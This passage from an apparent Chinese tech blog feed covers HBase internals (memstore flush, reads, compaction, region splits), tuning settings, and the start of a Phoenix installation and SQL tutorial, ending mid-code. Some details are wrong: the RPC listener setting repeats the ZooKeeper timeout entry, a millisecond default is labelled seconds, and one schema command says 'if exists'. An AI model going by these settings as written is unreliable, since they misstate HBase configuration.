hbase.hregion.memstore.block.multiplier（默认值4）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时，会<strong>阻止继续往</strong>该memstore写数据。</p><p>2）当region server中memstore的总大小达到</p><pre class="line-numbers language-bash"><code class="language-bash">java_heapsize*hbase.regionserver.global.memstore.size（默认值0.4）*hbase.regionserver.global.memstore.size.lower.limit（默认值0.95）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>region会按照其所有memstore的大小顺序（由大到小）依次进行刷写。直到region server中所有memstore的总大小减小到上述值以下。</p><p>当region server中memstore的总大小达到</p><pre class="line-numbers language-bash"><code class="language-bash">java_heapsize*hbase.regionserver.global.memstore.size（默认值0.4）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时，会阻止继续往所有的memstore写数据。</p><ol start="3"><li>到达自动刷写的时间，也会触发memstore flush。自动刷新的时间间隔由该属性进行配置<strong>hbase.regionserver.optionalcacheflushinterval（默认1小时）</strong>。</li></ol><p>4)当WAL文件的数量超过hbase.regionserver.max.logs，region会按照时间顺序依次进行刷写，直到WAL文件数量减小到hbase.regionserver.max.logs以下（该属性名已经废弃，现无需手动设置，最大值为32）。</p><h2 id="1-4-读流程"><a href="#1-4-读流程" class="headerlink" title="1.4 读流程"></a>1.4 读流程</h2><h3 id="1-4-1-整体流程"><a href="#1-4-1-整体流程" class="headerlink" title="1.4.1 整体流程"></a>1.4.1 整体流程</h3><p>和写的流程是一样的。</p><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637810986292.png" alt="1637810986292"></p><h3 id="1-4-2-Merge细节"><a href="#1-4-2-Merge细节" class="headerlink" title="1.4.2 Merge细节"></a>1.4.2 Merge细节</h3><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637811017103.png" alt="1637811017103"></p><p><strong>读流程</strong></p><p>1）Client先访问zookeeper，获取hbase:meta表位于哪个Region Server。</p><p>2）访问对应的Region Server，获取hbase:meta表，根据读请求的namespace:table/rowkey，查询出目标数据位于哪个Region Server中的哪个Region中。并将该table的region信息以及meta表的位置信息缓存在客户端的meta cache，方便下次访问。</p><p>3）与目标Region Server进行通讯；</p><p>4）分别在MemStore和Store File（HFile）中查询目标数据，并将查到的所有数据进行合并。此处所有数据是指同一条数据的不同版本（time stamp）或者不同的类型（Put/Delete）。</p><p>5）将查询到的新的数据块（Block，HFile数据存储单元，默认大小为64KB）缓存到Block Cache。</p><p>6）将合并后的最终结果返回给客户端。</p><h2 id="1-5-StoreFile-Compaction"><a href="#1-5-StoreFile-Compaction" class="headerlink" title="1.5 StoreFile Compaction"></a>1.5 StoreFile Compaction</h2><p>由于memstore每次刷写都会生成一个新的HFile，且同一个字段的不同版本（timestamp）和不同类型（Put/Delete）有可能会分布在不同的HFile中，因此查询时需要遍历所有的HFile。<strong>为了减少HFile的个数，以及清理掉过期和删除的数据，会进行StoreFile Compaction</strong>。</p><p>Compaction分为两种，分别是<strong>Minor Compaction</strong>和<strong>Major Compaction</strong>。Minor Compaction会将临近的若干个较小的HFile合并成一个较大的HFile，并<strong>清理掉部分过期和删除的数据</strong>。Major Compaction会将一个Store下的所有的HFile合并成一个大HFile，<strong>并且会清理掉所有过期和删除的数据。</strong></p><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637811135391.png" alt="1637811135391"></p><h2 id="1-6-Region-Split"><a href="#1-6-Region-Split" class="headerlink" title="1.6 Region Split"></a>1.6 Region Split</h2><p>默认情况下，每个Table起初只有一个Region，随着数据的不断写入，Region会自动进行拆分。刚拆分时，两个子Region都位于当前的Region Server，但处于负载均衡的考虑，HMaster有可能会将某个Region转移给其他的Region Server。</p><p><strong>Region Split时机：</strong></p><p>1)当1个region中的某个Store下所有StoreFile的总大小超过hbase.hregion.max.filesize，该Region就会进行拆分（0.94版本之前）。</p><p>2)当1个region中的某个Store下所有StoreFile的总大小超过*<em>Min(initialSize x R^3 ,hbase.hregion.max.filesize”)**，该Region就会进行拆分。其中initialSize的默认值为2</em>hbase.hregion.memstore.flush.size，R为当前Region Server中属于该Table的Region个数（0.94版本之后）。</p><p>具体的切分策略为：</p><p>第一次split：1^3 * 256 = 256MB </p><p>第二次split：2^3 * 256 = 2048MB </p><p>第三次split：3^3 * 256 = 6912MB </p><p>第四次split：4^3 * 256 = 16384MB &gt; 10GB，因此取较小的值10GB </p><p>后面每次split的size都是10GB了。</p><p>3)Hbase 2.0引入了新的split策略：如果当前RegionServer上该表只有一个Region，按照2 * hbase.hregion.memstore.flush.size分裂，否则按照hbase.hregion.max.filesize分裂。</p><p>  <img src="/2020/11/25/bigdata-HBase2-framework/1637811167674.png" alt="1637811167674"></p><h1 id="2-HBase优化"><a href="#2-HBase优化" class="headerlink" title="2 HBase优化"></a>2 HBase优化</h1><h2 id="2-1-预分区-region"><a href="#2-1-预分区-region" class="headerlink" title="2.1 预分区(region)"></a>2.1 预分区(region)</h2><p>建表的时候就设计好几个分区。</p><p>每一个region维护着startRow与endRowKey，如果加入的数据符合某个region维护的rowKey范围，则该数据交给这个region维护。那么依照这个原则，我们可以将数据所要投放的分区提前大致的规划好，以提高HBase性能。</p><p>1）手动设定预分区</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token operator">></span> create <span class="token string">'staff1'</span>,<span class="token string">'info'</span>,SPLITS <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'1000'</span>,<span class="token string">'2000'</span>,<span class="token string">'3000'</span>,<span class="token string">'4000'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)生成16进制序列预分区</p><pre class="line-numbers language-bash"><code class="language-bash">create <span class="token string">'staff2'</span>,<span class="token string">'info'</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;NUMREGIONS => 15, SPLITALGO => 'HexStringSplit'&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3)按照文件中设置的规则预分区</p><p>创建splits.txt文件内容如下：</p><pre class="line-numbers language-bash"><code class="language-bash">aaaabbbbccccdddd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行：</p><pre class="line-numbers language-bash"><code class="language-bash">create <span class="token string">'staff3'</span>,<span class="token string">'info'</span>,SPLITS_FILE <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'splits.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4)使用JavaAPI创建预分区</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//自定义算法，产生一系列Hash散列值存储在二维数组中</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> splitKeys <span class="token operator">=</span> 某个散列值函数<span class="token comment" spellcheck="true">//创建HbaseAdmin实例</span>HBaseAdmin hAdmin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBaseAdmin</span><span class="token punctuation">(</span>HbaseConfiguration<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建HTableDescriptor实例</span>HTableDescriptor tableDesc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HTableDescriptor</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过HTableDescriptor实例和散列值二维数组创建带有预分区的Hbase表</span>hAdmin<span class="token punctuation">.</span><span class="token function">createTable</span><span class="token punctuation">(</span>tableDesc<span class="token punctuation">,</span> splitKeys<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-RowKey设计"><a href="#2-2-RowKey设计" class="headerlink" title="2.2 RowKey设计"></a>2.2 RowKey设计</h2><p>一条数据的唯一标识就是rowkey，那么这条数据存储于哪个分区，取决于rowkey处于哪个一个预分区的区间内，设计rowkey的主要目的 ，就是让数据均匀的分布于所有的region中，在一定程度上防止数据倾斜。接下来我们就谈一谈rowkey常用的设计方案。</p><p>1)生成随机数、hash、散列值</p><p>比如：<br>原本rowKey为1001的，SHA1后变成：dd01903921ea24941c26a48f2cec24e0bb0e8cc7<br>原本rowKey为3001的，SHA1后变成：49042c54de64a1e9bf0b33e00245660ef92dc7bd<br>原本rowKey为5001的，SHA1后变成：7b61dec07e02c188790670af43e717f0f46e8913<br>在做此操作之前，一般我们会选择从数据集中抽取样本，来决定什么样的rowKey来Hash后作为每个分区的临界值。</p><p>2)字符串反转</p><p>20170524000001转成10000042507102<br>20170524000002转成20000042507102</p><p>这样也可以在一定程度上散列逐步put进来的数据。</p><p>3)字符串拼接</p><p>20170524000001_a12e<br>20170524000001_93i7</p><p><strong>rowkey设计原则：</strong></p><p>唯一性  散列性  长度</p><p><img src="/2020/11/25/bigdata-HBase2-framework/1637828239660.png" alt="1637828239660"></p><p><img src="/2020/11/25/bigdata-HBase2-framework/1637828222514.png" alt="1637828222514"></p><p><img src="/2020/11/25/bigdata-HBase2-framework/1637828263210.png" alt="1637828263210"></p><h2 id="2-3-内存优化"><a href="#2-3-内存优化" class="headerlink" title="2.3 内存优化"></a>2.3 内存优化</h2><p>HBase操作过程中需要大量的内存开销，毕竟Table是可以缓存在内存中的，但是不建议分配非常大的堆内存，因为GC过程持续太久会导致RegionServer处于长期不可用状态，一般16~36G内存就可以了，如果因为框架占用内存过高导致系统内存不足，框架一样会被系统服务拖死。</p><h2 id="2-4-基础优化"><a href="#2-4-基础优化" class="headerlink" title="2.4 基础优化"></a>2.4 基础优化</h2><p>1)Zookeeper会话超时时间</p><p>hbase-site.xml</p><p>属性：zookeeper.session.timeout</p><p>解释：默认值为90000毫秒（90s）。当某个RegionServer挂掉，90s之后Master才能察觉到。可适当减小此值，以加快Master响应，可调整至60000毫秒。</p><p>2)设置RPC监听数量</p><p>hbase-site.xml</p><p>属性：zookeeper.session.timeout<br>解释：默认值为90000毫秒（90s）。当某个RegionServer挂掉，90s之后Master才能察觉到。可适当减小此值，以加快Master响应，可调整至60000毫秒。</p><p>3)手动控制Major Compaction</p><p>hbase-site.xml</p><p>属性：hbase.hregion.majorcompaction</p><p>解释：默认值：604800000秒（7天）， Major Compaction的周期，若关闭自动Major Compaction，可将其设为0</p><p>4)优化HStore文件大小</p><p>hbase-site.xml</p><p>属性：hbase.hregion.max.filesize<br>解释：默认值10737418240（10GB），如果需要运行HBase的MR任务，可以减小此值，因为一个region对应一个map任务，如果单个region过大，会导致map任务执行时间过长。该值的意思就是，如果HFile的大小达到这个数值，则这个region会被切分为两个Hfile。</p><ol start="5"><li>优化HBase客户端缓存</li></ol><p>hbase-site.xml</p><p>属性：hbase.client.write.buffer<br>解释：默认值2097152bytes（2M）用于指定HBase客户端缓存，增大该值可以减少RPC调用次数，但是会消耗更多内存，反之则反之。一般我们需要设定一定的缓存大小，以达到减少RPC次数的目的。</p><p>6)指定scan.next扫描HBase所获取的行数</p><p>hbase-site.xml</p><p>属性：hbase.client.scanner.caching<br>解释：用于指定scan.next方法获取的默认行数，值越大，消耗内存越大。</p><p>7)BlockCache占用RegionServer堆内存的比例</p><p>hbase-site.xml</p><p>属性：hfile.block.cache.size<br>解释：默认0.4，读请求比较多的情况下，可适当调大</p><p>8.MemStore占用RegionServer堆内存的比例</p><p>hbase-site.xml</p><p>属性：hbase.regionserver.global.memstore.size<br>解释：默认0.4，写请求较多的情况下，可适当调大</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/HBase/">HBase</category>
      
      
      <comments>https://m01ly.github.io/2020/11/25/bigdata-HBase2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HBase学习笔记（四） HBase整合phoenix和Hive</title>
      <link>https://m01ly.github.io/2020/11/25/bigdata-HBase4-phoenix/</link>
      <guid>https://m01ly.github.io/2020/11/25/bigdata-HBase4-phoenix/</guid>
      <pubDate>Wed, 25 Nov 2020 03:23:17 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-整合Phoenix"><a href="#1-整合Phoenix" class="headerlink" title="1 整合Phoenix"></a>1 整合Phoenix</h1><h2 id="1-1-Phoenix简介"><a href="#1-1-Phoenix简介" class="headerlink" title="1.1 Phoenix简介"></a>1.1 Phoenix简介</h2><h3 id="1-1-1-Phoenix定义"><a href="#1-1-1-Phoenix定义" class="headerlink" title="1.1.1 Phoenix定义"></a>1.1.1 Phoenix定义</h3><p><a href="https://phoenix.apache.org/">Phoenix</a>是HBase的开源SQL皮肤。可以使用标准JDBC API代替HBase客户端API来创建表，插入数据和查询HBase数据。（Phoenix是HBase的JDBC类型客户端）。</p><p>可以把Phoenix理解成数据库，并且有事务，底层存储就是HBase。</p><p>Phoenix查询数据可以用sql查询的方式，Phoenix默认执行的语句到了hbase中都是大写的，除非使用双引号。</p><h3 id="1-1-2-Phoenix特点"><a href="#1-1-2-Phoenix特点" class="headerlink" title="1.1.2 Phoenix特点"></a>1.1.2 Phoenix特点</h3><p>1）容易集成：如Spark，Hive，Pig，Flume和Map Reduce；</p><p>2）操作简单：DML命令（CRUD）以及通过DDL（建库建表）命令创建和操作表和版本化增量更改；</p><p>3）支持HBase二级索引创建。</p><h3 id="1-1-3-Phoenix架构"><a href="#1-1-3-Phoenix架构" class="headerlink" title="1.1.3 Phoenix架构"></a>1.1.3 Phoenix架构</h3><p>Phoenix怎么和HBase去集成呢？</p><p><strong>（1）第一种方式：薄客户端：</strong>下图是Phoenix thin client，Phoenix thin client写Sql命令，Regionserver中的Phoenix  Query server服务将其转化为Hbase语句。</p><p><strong>（2）第二种方式：厚客户端：</strong>Phoenix thick client将Phoenix  Query server服务封装到本身的Phoenix 客户端里面。Phoenix 内部直接将SQL转化为Hbase语句。</p><p><img src="/2020/11/25/bigdata-HBase4-phoenix/1637834908636.png" alt="1637834908636"></p><h2 id="1-2-Phoenix快速入门"><a href="#1-2-Phoenix快速入门" class="headerlink" title="1.2 Phoenix快速入门"></a>1.2 Phoenix快速入门</h2><h3 id="1-2-1-安装"><a href="#1-2-1-安装" class="headerlink" title="1.2.1 安装"></a>1.2.1 安装</h3><p>1.官网地址</p><p><a href="http://phoenix.apache.org/">http://phoenix.apache.org/</a></p><p>2.Phoenix部署</p><p>1）上传并解压tar包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf apache-phoenix-5.0.0-HBase-2.0-bin.tar.gz -C /opt/module/<span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> apache-phoenix-5.0.0-HBase-2.0-bin phoenix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）复制Phoenix server包并拷贝到各个节点的hbase/lib：用于Phoenix 和连接hbase。分发后，重启hbase</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">cd</span> /opt/module/phoenix/<span class="token punctuation">[</span>molly@hadoop102 phoenix<span class="token punctuation">]</span>$ <span class="token function">cp</span> /opt/module/phoenix/phoenix-5.0.0-HBase-2.0-server.jar /opt/module/hbase/lib/<span class="token punctuation">[</span>molly@hadoop102 phoenix<span class="token punctuation">]</span>$ xsync /opt/module/hbase/lib/phoenix-5.0.0-HBase-2.0-server.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4）配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#phoenix</span><span class="token function">export</span> PHOENIX_HOME<span class="token operator">=</span>/opt/module/phoenix<span class="token function">export</span> PHOENIX_CLASSPATH<span class="token operator">=</span><span class="token variable">$PHOENIX_HOME</span><span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$PHOENIX_HOME</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5）重启HBase</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ stop-hbase.sh<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ start-hbase.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>厚Phoenix连接Hbase：sqlline.py</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop101 phoenix<span class="token punctuation">]</span>$ /opt/module/phoenix/bin/sqlline.py hadoop102,hadoop103,hadoop104:2181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/25/bigdata-HBase4-phoenix/1637835818060.png" alt="1637835818060"></p><ol start="7"><li>薄Phoenix连接Hbase：sqlline-thin.py</li></ol><p>需要先启用queryserver.py，再启用sqlline-thin.py指定去找queryserver（端口8765）。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop101 phoenix<span class="token punctuation">]</span>$ /opt/module/phoenix/bin/queryserver.py <span class="token punctuation">[</span>molly@hadoop101 phoenix<span class="token punctuation">]</span>$ /opt/module/phoenix/bin/sqlline-thin.py hadoop102：8765<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/25/bigdata-HBase4-phoenix/1637836402464.png" alt="1637836402464"></p><h3 id="1-2-2-Phoenix-Shell操作"><a href="#1-2-2-Phoenix-Shell操作" class="headerlink" title="1.2.2 Phoenix Shell操作"></a>1.2.2 Phoenix Shell操作</h3><h4 id="1-2-2-1-schema的操作"><a href="#1-2-2-1-schema的操作" class="headerlink" title="1.2.2.1 schema的操作"></a>1.2.2.1 schema的操作</h4><p>1）创建schema(库)</p><p>  默认情况下，在phoenix中不能直接创建schema。需要将如下的参数添加到Hbase中conf目录下的hbase-site.xml  和  phoenix中bin目录下的 hbase-site.xml中</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>phoenix.schema.isNamespaceMappingEnabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 重新启动Hbase和连接phoenix客户端.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ stop-hbase.sh<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ start-hbase.sh<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ /opt/module/phoenix/bin/sqlline.py hadoop102,hadoop103,hadoop104:2181<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 创建schema</p><pre class="line-numbers language-bash"><code class="language-bash">create schema bigdata<span class="token punctuation">;</span>create schema <span class="token keyword">if</span> exists bigdata<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意:在phoenix中，schema名，表名，字段名等会自动转换为大写，若要小写，使用双引号，如”student”。</strong></p><h4 id="1-2-2-2-表的操作"><a href="#1-2-2-2-表的操作" class="headerlink" title="1.2.2.2 表的操作"></a>1.2.2.2 表的操作</h4><p>1）显示所有表</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">!</span>table 或 <span class="token operator">!</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）创建表</p><p>直接指定单个列作为RowKey</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE TABLE IF NOT EXISTS student<span class="token punctuation">(</span><span class="token function">id</span> VARCHAR primary key,name VARCHAR,addr VARCHAR<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 指定多个列的联合作为RowKey</p><p> 3）插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">upsert into student values<span class="token punctuation">(</span><span class="token string">'1001'</span>,<span class="token string">'zhangsan'</span>,<span class="token string">'beijing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）查询记录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span class="token keyword">select</span> * from student where id<span class="token operator">=</span><span class="token string">'1001'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5）删除记录</p><pre class="line-numbers language-bash"><code class="language-bash">delete from student where id<span class="token operator">=</span><span class="token string">'1001'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）删除表</p><pre class="line-numbers language-bash"><code class="language-bash">drop table student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）退出命令行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">!</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-2-2-3-表的映射"><a href="#1-2-2-3-表的映射" class="headerlink" title="1.2.2.3 表的映射"></a>1.2.2.3 表的映射</h4><p>1）表的关系</p><p>默认情况下，直接在HBase中创建的表，通过Phoenix是查看不到的。如果要在Phoenix中操作直接在HBase中创建的表，则需要在Phoenix中进行表的映射。映射方式有两种：视图映射和表映射。</p><p>2）命令行中创建表test</p><p>HBase 中test的表结构如下，两个列族info1、info2。</p><table><thead><tr><th>Rowkey</th><th>info1</th><th>info2</th></tr></thead><tbody><tr><td>id</td><td>name</td><td>address</td></tr></tbody></table><p>启动HBase Shell</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ /opt/module/hbase/bin/hbase shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建HBase表test</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:001:0<span class="token operator">></span> create <span class="token string">'test'</span>,<span class="token string">'info1'</span>,<span class="token string">'info2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）视图映射</p><p>Phoenix创建的视图是只读的，所以只能用来做查询，无法通过视图对源数据进行修改等操作。在phoenix中创建关联test表的视图</p><pre class="line-numbers language-bash"><code class="language-bash">0: jdbc:phoenix:hadoop101,hadoop102,hadoop103<span class="token operator">></span> create view <span class="token string">"test"</span><span class="token punctuation">(</span>id varchar primary key,<span class="token string">"info1"</span><span class="token keyword">.</span><span class="token string">"name"</span> varchar, <span class="token string">"info2"</span><span class="token keyword">.</span><span class="token string">"address"</span> varchar<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除视图</p><pre class="line-numbers language-bash"><code class="language-bash">0: jdbc:phoenix:hadoop101,hadoop102,hadoop103<span class="token operator">></span> drop view <span class="token string">"test"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）表映射</p><p>使用Apache Phoenix创建对HBase的表映射，有两种方法：</p><p>（1）HBase中不存在表时，可以直接使用create table指令创建需要的表,系统将会自动在Phoenix和HBase中创建person_infomation的表，并会根据指令内的参数对表结构进行初始化。</p><p>（2）当HBase中已经存在表时，可以以类似创建视图的方式创建关联表，只需要将create view改为create table即可。</p><pre class="line-numbers language-bash"><code class="language-bash">0: jdbc:phoenix:hadoop101,hadoop102,hadoop103<span class="token operator">></span> create table <span class="token string">"test"</span><span class="token punctuation">(</span>id varchar primary key,<span class="token string">"info1"</span><span class="token keyword">.</span><span class="token string">"name"</span> varchar, <span class="token string">"info2"</span><span class="token keyword">.</span><span class="token string">"address"</span> varchar<span class="token punctuation">)</span> column_encoded_bytes<span class="token operator">=</span>0<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1.2.2.4表映射中数值类型的问题</p><p>  Hbase中存储数值类型的值(如int,long等)会按照正常数字的补码进行存储. 而phoenix对数字的存储做了特殊的处理. phoenix 为了解决遇到正负数同时存在时，导致负数排到了正数的后面（负数高位为1，正数高位为0，字典序0 &lt; 1）的问题。 phoenix在存储数字时会对高位进行转换.原来为1,转换为0， 原来为0，转换为1.</p><p>  因此，如果hbase表中的数据的写是由phoenix写入的,不会出现问题，因为对数字的编解码都是phoenix来负责。如果hbase表中的数据不是由phoenix写入的，数字的编码由hbase负责. 而phoenix读数据时要对数字进行解码。 因为编解码方式不一致。导致数字出错.</p><p>1） 在hbase中创建表，并插入数值类型的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:001:0<span class="token operator">></span> create <span class="token string">'person'</span>,<span class="token string">'info'</span>hbase<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:001:0<span class="token operator">></span> put <span class="token string">'person'</span>,<span class="token string">'1001'</span>, <span class="token string">'info:salary'</span>,Bytes.toBytes<span class="token punctuation">(</span>123456<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意: 如果要插入数字类型，需要通过Bytes.toBytes(123456)来实现。</p><p>2）在phoenix中创建映射表并查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token string">"person"</span><span class="token punctuation">(</span>id varchar primary key,<span class="token string">"info"</span><span class="token keyword">.</span><span class="token string">"salary"</span> integer <span class="token punctuation">)</span> column_encoded_bytes<span class="token operator">=</span>0<span class="token keyword">select</span> * from <span class="token string">"person"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 会发现数字显示有问题</p><p>3） 解决办法:  </p><p>  在phoenix中创建表时使用无符号的数值类型. unsigned_long</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token string">"person"</span><span class="token punctuation">(</span>id varchar primary key,<span class="token string">"info"</span><span class="token keyword">.</span><span class="token string">"salary"</span> unsigned_long <span class="token punctuation">)</span> column_encoded_bytes<span class="token operator">=</span>0<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-3-Phoenix-JDBC-API操作"><a href="#1-2-3-Phoenix-JDBC-API操作" class="headerlink" title="1.2.3 Phoenix JDBC API操作"></a>1.2.3 Phoenix JDBC API操作</h3><h4 id="1-2-3-1-Thin-Client"><a href="#1-2-3-1-Thin-Client" class="headerlink" title="1.2.3.1 Thin Client"></a>1.2.3.1 Thin Client</h4><p>1）启动query server</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ queryserver.py start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）创建项目并导入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>​      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.phoenix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>​      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>phoenix-queryserver-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>​      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.0-HBase-2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）编写代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>phoenix<span class="token punctuation">.</span>queryserver<span 